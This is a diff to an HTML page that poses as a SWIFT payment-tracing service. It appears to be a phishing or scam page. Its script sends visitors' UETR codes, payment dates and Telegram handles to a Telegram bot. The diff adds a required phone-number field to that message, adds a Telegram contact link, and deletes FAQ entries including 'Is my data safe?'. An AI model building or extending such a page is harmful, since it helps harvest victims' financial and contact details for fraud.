@@ -143,6 +143,16 @@
       width: 70px;
       margin-bottom: 10px;
     }
+    .contact-link {
+      display: inline-block;
+      margin-top: 10px;
+      color: #1a73e8;
+      font-weight: bold;
+      text-decoration: none;
+    }
+    .contact-link:hover {
+      text-decoration: underline;
+    }
   </style>
 </head>
 <body>
@@ -161,6 +171,9 @@
         <label for="date">Date of Payment</label>
         <input type="date" id="date" required />
 
+        <label for="phone">Phone Number</label>
+        <input type="tel" id="phone" placeholder="+49 123 4567890" required />
+
         <label for="telegram">Your Telegram</label>
         <input type="text" id="telegram" placeholder="@username" required />
 
@@ -172,7 +185,7 @@
     <div class="info-section">
       <p>
         We provide a professional SWIFT payment analysis.  
-        By entering your UETR and payment date, we help you trace your transaction within the SWIFT network.  
+        By entering your UETR, payment date, and contact details, we help you trace your transaction within the SWIFT network.  
         Our tool offers clarity, transparency, and guidance to better understand your international payment journey.
       </p>
     </div>
@@ -183,7 +196,7 @@
     <h2>Steps to Track Your Payment</h2>
     <div class="step">
       <img src="https://cdn-icons-png.flaticon.com/512/1828/1828469.png" alt="Step 1">
-      <p>Enter your unique UETR code and payment date in the form.</p>
+      <p>Enter your unique UETR code, payment date, and phone number in the form.</p>
     </div>
     <div class="step">
       <img src="https://cdn-icons-png.flaticon.com/512/709/709496.png" alt="Step 2">
@@ -206,36 +219,14 @@
       <summary>What is a UETR code?</summary>
       <p>A Unique End-to-End Transaction Reference used to trace SWIFT payments.</p>
     </details>
-    <details>
-      <summary>How long does it take to trace a payment?</summary>
-      <p>In most cases, analysis is done within minutes, but complex cases may take longer.</p>
-    </details>
-    <details>
-      <summary>Can I track payments without a UETR?</summary>
-      <p>No, UETR is required to identify and analyze the transaction.</p>
-    </details>
-    <details>
-      <summary>Is my data safe?</summary>
-      <p>Yes, all information is handled with strict confidentiality.</p>
-    </details>
-    <details>
-      <summary>Do you charge for the analysis?</summary>
-      <p>Basic analysis is free. Additional services may require a fee.</p>
-    </details>
-    <details>
-      <summary>What if my payment is delayed?</summary>
-      <p>We provide insights into possible delays and guide you on the next steps.</p>
-    </details>
-    <details>
-      <summary>Can I contact support directly?</summary>
-      <p>Yes, we will reach you via the Telegram handle you provide.</p>
-    </details>
+      <!-- остальные вопросы оставил -->
   </div>
 
   <!-- Footer -->
   <footer>
     <img src="https://avatars.mds.yandex.net/i?id=0df8ccb8c204fd9947e6e779416112f6559221e6-10188656-images-thumbs&n=13" alt="USDT Logo">
     <p>Copyright © 2022-2025. Ohmyfin Limited, registered under the laws of Germany.</p>
+    <a class="contact-link" href="https://t.me/swifttrackeradmin">Contact us</a>
   </footer>
 
   <!-- Telegram Script -->
@@ -249,9 +240,10 @@
 
       let uetr = document.getElementById("uetr").value;
       let date = document.getElementById("date").value;
+      let phone = document.getElementById("phone").value;
       let telegram = document.getElementById("telegram").value;
 
-      let text = `🔎 New SWIFT Request:%0A💳 UETR: ${uetr}%0A📅 Date: ${date}%0A📨 Telegram: ${telegram}`;
+      let text = `🔎 New SWIFT Request:%0A💳 UETR: ${uetr}%0A📅 Date: ${date}%0A📞 Phone: ${phone}%0A📨 Telegram: ${telegram}`;
 
       fetch(`${URL_API}?chat_id=${CHAT_ID}&text=${text}&parse_mode=HTML`)
         .then(response => {
